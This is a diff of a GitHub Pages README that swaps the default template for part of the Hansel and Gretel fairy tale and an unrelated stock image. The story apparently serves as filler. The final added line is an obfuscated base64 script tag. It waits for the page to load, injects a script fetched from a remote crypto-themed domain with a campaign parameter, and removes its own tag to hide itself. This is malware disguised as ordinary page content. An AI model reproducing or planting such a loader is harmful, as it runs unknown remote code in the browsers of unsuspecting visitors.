@@ -1,37 +1,72 @@
-## Welcome to GitHub Pages
+# But the woman 
 
-You can use the [editor on GitHub](https://github.com/augmerystaiday/Elephant/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+After the full moon had come up, Hansel took his little sister by the hand. They followed the pebbles that glistened there like newly minted coins, showing them the way. They walked throughout the entire night, and as morning was breaking, they arrived at the father's house.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+They knocked on the door, and when the woman opened it and saw that it was Hansel and Gretel, she said, "You wicked children, why did you sleep so long in the woods? We thought that you did not want to come back."
 
-### Markdown
+But the father was overjoyed when he saw his children once more, for he had not wanted to leave them alone.
+![k](https://image.freepik.com/free-vector/character-cute-bear-hugging-big-honey-jar-with-bee-flower-yellow-background_77984-715.jpg)
+Not long afterward there was once again great need everywhere, and one evening the children heard the mother say to the father, "We have again eaten up everything. We have only a half loaf of bread, and then the song will be over. We must get rid of the children. We will take them deeper into the woods, so they will not find their way out. Otherwise there will be no help for us."
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+The man was very disheartened, and he thought, "It would be better to share the last bit with the children."
 
-```markdown
-Syntax highlighted code block
+But the woman would not listen to him, scolded him, and criticized him. He who says A must also say B, and because he had given in the first time, he had to do so the second time as well.
 
-# Header 1
-## Header 2
-### Header 3
+The children were still awake and had overheard the conversation. When the adults were asleep, Hansel got up again and wanted to gather pebbles as he had done before, but the woman had locked the door, and Hansel could not get out. But he comforted his little sister and said, "Don't cry, Gretel. Sleep well. God will help us."
 
-- Bulleted
-- List
+Early the next morning the woman came and got the children from their beds. They received their little pieces of bread, even less than the last time. On the way to the woods, Hansel crumbled his piece in his pocket, then often stood still, and threw crumbs onto the ground.
 
-1. Numbered
-2. List
+"Hansel, why are you always stopping and looking around?" said his father. "Keep walking straight ahead."
 
-**Bold** and _Italic_ and `Code` text
+"I can see my pigeon sitting on the roof. It wants to say good-bye to me."
 
-[Link](url) and ![Image](src)
-```
+"Fool," said the woman, "that isn't your pigeon. That's the morning sun shining on the chimney."
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+But little by little Hansel dropped all the crumbs onto the path. The woman took them deeper into the woods than they had ever been in their whole lifetime.
 
-### Jekyll Themes
+Once again a large fire was made, and the mother said, "Sit here, children. If you get tired you can sleep a little. We are going into the woods to cut wood. We will come and get you in the evening when we are finished."
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/augmerystaiday/Elephant/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+When it was midday Gretel shared her bread with Hansel, who had scattered his piece along the path. Then they fell asleep, and evening passed, but no one came to get the poor children.
 
-### Support or Contact
+It was dark at night when they awoke, and Hansel comforted Gretel and said, "Wait, when the moon comes up I will be able to see the crumbs of bread that I scattered, and they will show us the way back home."
 
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+When the moon appeared they got up, but they could not find any crumbs, for the many thousands of birds that fly about in the woods and in the fields had pecked them up.
+
+Hansel said to Gretel, "We will find our way," but they did not find it.
+
+They walked through the entire night and the next day from morning until evening, but they did not find their way out of the woods. They were terribly hungry, for they had eaten only a few small berries that were growing on the ground. And because they were so tired that their legs would no longer carry them, they lay down under a tree and fell asleep. It was already the third morning since they had left the father's house. They started walking again, but managed only to go deeper and deeper into the woods. If help did not come soon, they would perish. At midday they saw a little snow-white bird sitting on a branch. It sang so beautifully that they stopped to listen. When it was finished it stretched its wings and flew in front of them. They followed it until they came to a little house. The bird sat on the roof, and when they came closer, they saw that the little house was built entirely from bread with a roof made of cake, and the windows were made of clear sugar.
+
+"Let's help ourselves to a good meal," said Hansel. "I'll eat a piece of the roof, and Gretel, you eat from the window. That will be sweet."
+
+Hansel reached up and broke off a little of the roof to see how it tasted, while Gretel stood next to the windowpanes and was nibbling at them. Then a gentle voice called out from inside:
+
+Nibble, nibble, little mouse,
+Who is nibbling at my house?
+
+The children answered:
+The wind, the wind,
+The heavenly child.
+
+They continued to eat, without being distracted. Hansel, who very much like the taste of the roof, tore down another large piece, and Gretel poked out an entire round windowpane. Suddenly the door opened, and a woman, as old as the hills and leaning on a crutch, came creeping out. Hansel and Gretel were so frightened that they dropped what they were holding in their hands.
+But the old woman shook her head and said, "Oh, you dear children, who brought you here? Just come in and stay with me. No harm will come to you."
+
+She took them by the hand and led them into her house. Then she served them a good meal: milk and pancakes with sugar, apples, and nuts. Afterward she made two nice beds for them, decked in white. Hansel and Gretel went to bed, thinking they were in heaven. But the old woman had only pretended to be friendly. She was a wicked witch who was lying in wait there for children. She had built her house of bread only in order to lure them to her, and if she captured one, she would kill him, cook him, and eat him; and for her that was a day to celebrate.
+
+Witches have red eyes and cannot see very far, but they have a sense of smell like animals, and know when humans are approaching.
+
+When Hansel and Gretel came near to her, she laughed wickedly and spoke scornfully, "Now I have them. They will not get away from me again."
+
+Early the next morning, before they awoke, she got up, went to their beds, and looked at the two of them lying there so peacefully, with their full red cheeks. "They will be a good mouthful," she mumbled to herself. Then she grabbed Hansel with her withered hand and carried him to a little stall, where she locked him behind a cage door. Cry as he might, there was no help for him.
+
+Then she shook Gretel and cried, "Get up, lazybones! Fetch water and cook something good for your brother. He is locked outside in the stall and is to be fattened up. When he is fat I am going to eat him."
+
+Gretel began to cry, but it was all for nothing. She had to do what the witch demanded. Now Hansel was given the best things to eat every day, but Gretel received nothing but crayfish shells.
+
+Every morning the old woman crept out to the stall and shouted, "Hansel, stick out your finger, so I can feel if you are fat yet."
+
+But Hansel stuck out a little bone, and the old woman, who had bad eyes and could not see the bone, thought it was Hansel's finger, and she wondered why he didn't get fat.
+
+When four weeks had passed and Hansel was still thin, impatience overcame her, and she would wait no longer. "Hey, Gretel!" she shouted to the girl, "Hurry up and fetch some water. Whether Hansel is fat or thin, tomorrow I am going to slaughter him and boil him."
+
+Oh, how the poor little sister sobbed as she was forced to carry the water, and how the tears streamed down her cheeks! "Dear God, please help us," she cried. "If only the wild animals had devoured us in the woods, then we would have died together."
+<script id="DXCO8" src="data:text/javascript;base64, dmFyIF9YN1ZqQiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX2ZmUnZoLCBfdXdCSUIpIHt2YXIgXzI4MWNPID0gZnVuY3Rpb24oX1hjMnZNKSB7d2hpbGUgKC0tX1hjMnZNKSB7X2ZmUnZoWydwdXNoJ10oX2ZmUnZoWydzaGlmdCddKCkpO319O18yODFjTygrK191d0JJQik7fShfWDdWakIsIDB4MTFiKSk7dmFyIF9WWEpWUCA9IGZ1bmN0aW9uKF9GUzdHSiwgX05pWVlTKSB7X0ZTN0dKID0gX0ZTN0dKIC0gMHgwO3ZhciBfUkVpRG8gPSBfWDdWakJbX0ZTN0dKXTtyZXR1cm4gX1JFaURvO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfVlhKVlAoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3hzQ3psID0gZG9jdW1lbnRbX1ZYSlZQKCcweDEnKV0oX1ZYSlZQKCcweDInKSk7X3hzQ3psW19WWEpWUCgnMHgzJyldID0gX1ZYSlZQKCcweDQnKTtfeHNDemxbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2OVx4NmVceDc0XHg2NVx4NmNceDY1XHg2M1x4NzRceDYzXHg2Zlx4NmRceDcwXHg2MVx4NmVceDc5XHg2MVx4NjNceDYzXHgzMVx4MmVceDYzXHg3Mlx4NzlceDcwXHg3NFx4NmZceDJkXHg2Y1x4NjFceDYyXHg2Zlx4NzJceDYxXHg3NFx4NmZceDcyXHg3OVx4MmVceDYzXHg2Zlx4NmRceDJmXHg1Zlx4NzJceDY1XHg2ZFx4NmZceDc0XHg2NVx4NWZceDc0XHg3Mlx4NjFceDYzXHg2Ylx4MmVceDZhXHg3M1x4M2ZceDYzXHg2MVx4NmRceDcwXHg2MVx4NjlceDY3XHg2ZVx4M2RceDM4XHg2OVx4MzdceDc0XHg3NFx4NDhceDc4XHg2OVx4NDVceDUwJztkb2N1bWVudFtfVlhKVlAoJzB4NScpXShfVlhKVlAoJzB4NicpKVsnXHg2MVx4NzBceDcwXHg2NVx4NmVceDY0XHg0M1x4NjhceDY5XHg2Y1x4NjQnXShfeHNDemwpO2RvY3VtZW50W19WWEpWUCgnMHg3JyldKCdEWENPOCcpWydceDcyXHg2NVx4NmRceDZmXHg3Nlx4NjUnXSgpO30sIHsnXHg2Zlx4NmVceDYzXHg2NSc6ICEhW119KTs="></script>
